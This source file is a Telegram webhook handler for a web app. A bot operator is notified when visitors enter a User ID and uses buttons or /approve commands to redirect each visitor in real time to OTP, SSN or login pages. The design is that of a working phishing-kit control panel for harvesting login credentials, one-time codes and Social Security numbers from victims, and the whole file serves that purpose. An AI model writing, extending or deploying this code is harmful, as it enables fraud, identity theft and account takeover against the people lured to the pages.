// Telegram webhook endpoint
// Receives updates from Telegram and processes commands

import { sendTelegramMessage } from '../telegram';
import { getRecentActivities } from '../kv-client';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callback = update.callback_query;
      const data = callback.data;
      const chatId = callback.message.chat.id;
      const messageId = callback.message.message_id;
      
      console.log('[telegram] Received callback:', data);
      
      // Handle redirect buttons for visitor
      if (data.startsWith('redirect_')) {
        const redirectType = data.replace('redirect_', '');
        let pagePath = '/';
        
        if (redirectType === 'otp') {
          pagePath = '/otp';
        } else if (redirectType === 'ssn') {
          pagePath = '/personal'; // Assuming SSN page is personal page
        } else if (redirectType === 'login') {
          pagePath = '/';
        }
        
        console.log('[telegram] Processing redirect button:', redirectType, 'to', pagePath);
        
        // Extract visitor ID from message text (try multiple patterns)
        const messageText = callback.message.text || callback.message.caption || '';
        console.log('[telegram] Full message object:', JSON.stringify(callback.message, null, 2));
        console.log('[telegram] Message text:', messageText);
        
        // Try multiple patterns to extract visitor ID
        let visitorId = messageText.match(/Visitor ID: <code>(.*?)<\/code>/)?.[1] ||
                       messageText.match(/Visitor ID: <code>(.*?)<\/code>/i)?.[1] ||
                       messageText.match(/Visitor ID:\s*<code>(.*?)<\/code>/)?.[1] ||
                       messageText.match(/Visitor ID:\s*(.*?)\n/)?.[1] ||
                       messageText.match(/Visitor ID:\s*(.*?)$/m)?.[1] ||
                       messageText.match(/Visitor ID:\s*(.*?)(?:\n|$)/)?.[1];
        
        // Clean up visitor ID (remove HTML entities if any)
        if (visitorId) {
          visitorId = visitorId.trim().replace(/&lt;/g, '<').replace(/&gt;/g, '>');
        }
        
        console.log('[telegram] Extracted visitor ID:', visitorId);
        console.log('[telegram] Visitor ID length:', visitorId?.length);
        
        // Answer callback query immediately (don't wait)
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const answerResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callback.id,
            text: `Redirecting to ${redirectType.toUpperCase()} PAGE`
          })
        });
        console.log('[telegram] Callback query answered:', await answerResponse.json());
        
        if (visitorId) {
          try {
            // Determine base URL - use production URL if available, otherwise detect from request
            let baseUrl = process.env.NEXT_PUBLIC_APP_URL;
            if (!baseUrl) {
              // Try to detect from request headers
              const protocol = req.headers['x-forwarded-proto'] || 'https';
              const host = req.headers['x-forwarded-host'] || req.headers.host;
              baseUrl = host ? `${protocol}://${host}` : 'https://your-project.vercel.app';
            }
            
            console.log('[telegram] Calling redirect/set API:', `${baseUrl}/api/redirect/set`);
            console.log('[telegram] Sending redirect command:', {
              visitorId,
              redirectType,
              pagePath,
              baseUrl
            });
            
            // Store redirect command - AWAIT to ensure it completes
            const redirectResponse = await fetch(`${baseUrl}/api/redirect/set`, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'Telegram-Bot-Webhook'
              },
              body: JSON.stringify({
                visitorId: visitorId.trim(),
                redirectType: redirectType,
                pagePath: pagePath
              })
            });
            
            if (!redirectResponse.ok) {
              const errorText = await redirectResponse.text();
              console.error('[telegram] Redirect set failed:', redirectResponse.status, errorText);
              await sendTelegramMessage(
                `❌ Error: Failed to set redirect (${redirectResponse.status})`,
                chatId
              );
            } else {
              const redirectResult = await redirectResponse.json();
              console.log('[telegram] ✅ Redirect set successfully:', redirectResult);
              console.log('[telegram] Redirect will be picked up by polling within 100ms');
            }
          } catch (error) {
            console.error('[telegram] Error in redirect setup:', error);
            console.error('[telegram] Error stack:', error.stack);
            await sendTelegramMessage(
              `❌ Error: ${error.message}`,
              chatId
            );
          }
        } else {
          console.error('[telegram] ❌ Could not extract visitor ID from message');
          console.error('[telegram] Message text was:', messageText);
          await sendTelegramMessage(
            `❌ Error: Could not find visitor ID in message. Message: ${messageText.substring(0, 100)}`,
            chatId
          );
        }
        
        // Send confirmation message
        sendTelegramMessage(
          `✅ Redirecting visitor to ${redirectType.toUpperCase()} PAGE`,
          chatId
        ).catch(err => console.error('[telegram] Error sending confirmation:', err));
        
        return res.status(200).json({ ok: true });
      }
      
      // Handle approve buttons for activities
      if (data.startsWith('approve_')) {
        const parts = data.split('_');
        const redirectType = parts[1]; // otp, ssn, login
        const activityId = parts.slice(2).join('_');
        
        try {
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const approveResponse = await fetch(`${baseUrl}/api/approve`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              activityId: activityId,
              redirectType: redirectType
            })
          });
          
          const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
          if (approveResponse.ok) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback.id,
                text: `✅ Redirected to ${redirectType.toUpperCase()} PAGE`
              })
            });
            
            await sendTelegramMessage(
              `✅ Approved activity ${activityId}\nUser redirected to ${redirectType.toUpperCase()} PAGE.`,
              chatId
            );
          } else {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback.id,
                text: `❌ Error approving`
              })
            });
          }
        } catch (error) {
          console.error('[telegram] Error approving:', error);
          const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: callback.id,
              text: `❌ Error: ${error.message}`
            })
          });
        }
        
        return res.status(200).json({ ok: true });
      }
    }
    
    // Handle webhook updates from Telegram
    if (update.message) {
      const message = update.message;
      const text = message.text || '';
      const chatId = message.chat.id;
      
      console.log('[telegram] Received message:', text, 'from chat:', chatId);
      
      // Handle /start command
      if (text.startsWith('/start')) {
        await sendTelegramMessage(
          '🤖 Bot activated!\n\n' +
          'You will receive notifications when users enter their User ID.\n' +
          'Use /approve_<activityId> to approve and redirect to OTP page.',
          chatId
        );
        return res.status(200).json({ ok: true });
      }
      
      // Handle /approve_<activityId> command
      if (text.startsWith('/approve_')) {
        const activityId = text.replace('/approve_', '').trim();
        
        if (!activityId) {
          await sendTelegramMessage('Usage: /approve_<activityId>', chatId);
          return res.status(200).json({ ok: true });
        }
        
        try {
          // Call internal approve API
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const approveResponse = await fetch(`${baseUrl}/api/approve`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              activityId: activityId,
              redirectType: 'otp'
            })
          });
          
          if (approveResponse.ok) {
            await sendTelegramMessage(
              `✅ Approved activity ${activityId}\nUser redirected to OTP page.`,
              chatId
            );
          } else {
            await sendTelegramMessage(
              `❌ Error approving activity ${activityId}`,
              chatId
            );
          }
        } catch (error) {
          console.error('[telegram] Error approving:', error);
          await sendTelegramMessage(`❌ Error: ${error.message}`, chatId);
        }
        
        return res.status(200).json({ ok: true });
      }
      
      // Handle /activities command
      if (text === '/activities') {
        try {
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const activitiesResponse = await fetch(`${baseUrl}/api/activities`);
          const activitiesData = await activitiesResponse.json();
          
          if (activitiesData.success && activitiesData.activities && activitiesData.activities.length > 0) {
            let message = '📋 <b>Recent Activities:</b>\n\n';
            activitiesData.activities.slice(0, 5).forEach(activity => {
              message += `ID: <code>${activity.id}</code>\n`;
              message += `User: <code>${activity.userId || 'N/A'}</code>\n`;
              message += `Type: ${activity.type}\n`;
              message += `/approve_${activity.id}\n\n`;
            });
            await sendTelegramMessage(message, chatId);
          } else {
            await sendTelegramMessage('No activities found.', chatId);
          }
        } catch (error) {
          await sendTelegramMessage(`❌ Error: ${error.message}`, chatId);
        }
        
        return res.status(200).json({ ok: true });
      }
    }
    
    return res.status(200).json({ ok: true });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

